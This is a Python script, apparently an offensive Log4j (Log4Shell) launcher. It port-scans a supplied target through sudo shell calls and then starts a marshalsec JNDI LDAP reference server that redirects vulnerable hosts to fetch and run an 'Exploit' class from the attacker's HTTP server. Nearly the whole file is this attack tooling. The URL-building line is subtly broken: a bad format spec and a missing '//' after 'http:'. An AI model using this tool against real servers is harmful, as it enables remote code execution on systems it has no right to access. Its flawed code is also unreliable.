import files.colors,files.arguments,multiprocessing,os,sys,time
from colorama import Fore
from multiprocessing import Process
class Log4j(object):
    def __init__(self,target_ip,attacker_ip):
        self.target_ip = target_ip
        self.attacker_ip = attacker_ip
    @staticmethod
    def banner(s):
        for c in s + '\n':
            sys.stdout.write(files.colors.BWhite + c)
            sys.stdout.flush()
            time.sleep(1.5 / 100)
        print(Fore.WHITE + "─" * 38)
        print(f'{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Github:https://github.com/FonderElite')
        print(Fore.WHITE + "─" * 38)
        time.sleep(1)
        os.system("clear")
    def scan_port(self):
        os.system(f"sudo python3 files/portscanner.py -t {self.target_ip}")
    def ldap_server(self):
        exec_cmd = lambda x : os.system(x)
        if os.path.isfile("/tmp/solr.txt") == True:
            exec_cmd(f"sudo java -cp marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:{self.attacker_ip:8000}/#Exploit")
if __name__ == "__main__":
    log4j_class = Log4j(files.arguments.args.target, files.arguments.args.attackerip)
    banner = Process(target=log4j_class.banner, args=("""
╦  ┌┬┐┌─┐┌─┐   ╔═╗┌─┐┬─┐┬  ┬┌─┐┬─┐ ┌─┐┬ ┬
║   ││├─┤├─┘───╚═╗├┤ ├┬┘└┐┌┘├┤ ├┬┘ ├─┘└┬┘
╩═╝─┴┘┴ ┴┴     ╚═╝└─┘┴└─ └┘ └─┘┴└─o┴   ┴ 
        """,))
    portscan = Process(target=log4j_class.scan_port)
    ldap_server = Process(target=log4j_class.ldap_server)
    if files.arguments.args.target == None:
        print(f"{files.colors.BGreen} Usage: {Fore.CYAN}python3 {Fore.WHITE}<ldap_server.py> {Fore.GREEN}-t {Fore.WHITE}<target>")
    elif files.arguments.args.target != None:
        banner.start()
        banner.join()
        portscan.start()
        portscan.join()
        ldap_server.start()
        ldap_server.join()
